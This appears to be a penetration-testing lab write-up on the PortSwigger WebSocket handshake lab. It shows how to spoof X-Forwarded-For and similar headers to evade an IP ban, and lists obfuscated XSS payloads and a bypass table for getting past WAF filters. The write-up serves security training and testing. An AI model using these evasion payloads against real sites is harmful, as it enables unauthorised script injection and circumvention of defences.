# WebSockets - Handshake bypass (IP ban, obfuscated payloads)

Server blocks XSS payloads and terminates the WS connection, then bans your IP. Bypass: reconnect and inject `X-Forwarded-For` in the HTTP upgrade request to spoof IP. Then send an obfuscated XSS payload that evades the WAF pattern matching.

## Quick reference
```
# WS handshake = HTTP GET with Upgrade: websocket
# Reconnect -> intercept the GET /chat handshake request -> add:
X-Forwarded-For: 1.1.1.1
# -> new WS connection established from spoofed IP

# Obfuscated XSS (bypass WAF that blocks standard onerror= payloads):
<img src=1 oNeRrOr=alert`1`>
# mixed case event handler + template literal call
```

## Root cause
WAF blocks XSS patterns in WS message content and terminates connection. IP ban based on the IP seen in the HTTP handshake request - if server trusts `X-Forwarded-For`, spoofing it bypasses the ban. WAF pattern matching is case-sensitive or literal - mixed-case event handlers evade detection.

## Find it
1. Send XSS via WS -> connection closed + your IP banned.
2. Try reconnecting -> fails (IP banned).
3. Intercept reconnect handshake (HTTP GET /chat Upgrade) -> add `X-Forwarded-For: 1.1.1.1` -> succeed.
4. Try obfuscated payloads: `<img src=1 oNeRrOr=alert\`1\`>`.

## Technique
1. Send basic XSS `<img src=1 onerror='alert(1)'>` -> blocked, connection terminated.
2. Click "Reconnect" -> fail (IP ban).
3. In Burp, find the reconnect attempt - right-click -> Send to Repeater.
4. Add header: `X-Forwarded-For: 1.1.1.1` -> click Connect -> WS established.
5. Send obfuscated XSS via the new WS connection: `<img src=1 oNeRrOr=alert\`1\`>`.
6. Alert fires.

## Payload arsenal
```
# IP spoofing headers (try all)
X-Forwarded-For: 1.1.1.1
X-Real-IP: 1.1.1.1
X-Originating-IP: 1.1.1.1
True-Client-IP: 1.1.1.1

# Obfuscated XSS payloads
<img src=1 oNeRrOr=alert`1`>
<img src=1 OnErRoR=alert(1)>
<svg/OnLoAd=alert`1`>
<body onload=alert`1`>
<details open ontoggle=alert(1)>
```

## Bypasses
| Defense | Bypass |
|---|---|
| IP ban on XSS attempt | Spoof IP via X-Forwarded-For in WS upgrade request |
| WAF blocks `onerror='alert'` | Mixed-case: `oNeRrOr=alert\`1\`` |
| WAF blocks `alert(` | Template literal: `alert\`1\`` |

## Exploitation walkthrough
1. Live chat -> send `<img src=1 onerror='alert(1)'>` -> WAF blocks, connection closed.
2. Click Reconnect -> fails (IP banned).
3. In Burp Repeater (WS handshake GET /chat): add `X-Forwarded-For: 1.1.1.1` -> Connect -> success.
4. Send `<img src=1 oNeRrOr=alert\`1\`>` -> alert fires.

## Chaining
- Same as [Message-manipulation](../Message-manipulation/) once XSS lands
- IP bypass pattern reuses in [SSRF](../../SSRF/) (spoofing admin IP via X-Forwarded-For)

## Tools
- **Burp Repeater (WS mode)** - reconnect with modified handshake headers
- **Burp Proxy** - intercept reconnect upgrade request

## Labs

### Manipulating the WebSocket handshake to exploit vulnerabilities [Practitioner]
WAF blocks XSS + bans IP. Reconnect -> intercept handshake -> `X-Forwarded-For: 1.1.1.1` bypasses ban -> send `<img src=1 oNeRrOr=alert\`1\`>` (mixed-case evades WAF). Key insight: WS upgrade is HTTP -> injectable headers; WAF pattern matching is bypassable with case variation.

## Real-world notes
- X-Forwarded-For spoofing works whenever the server trusts it without validation (extremely common).
- Template literals (`alert\`1\``) and mixed-case event handlers are reliable WAF evasion primitives.
- WS handshake manipulation is a frequently overlooked vector - most testing focuses on HTTP.

## References
- https://portswigger.net/web-security/websockets
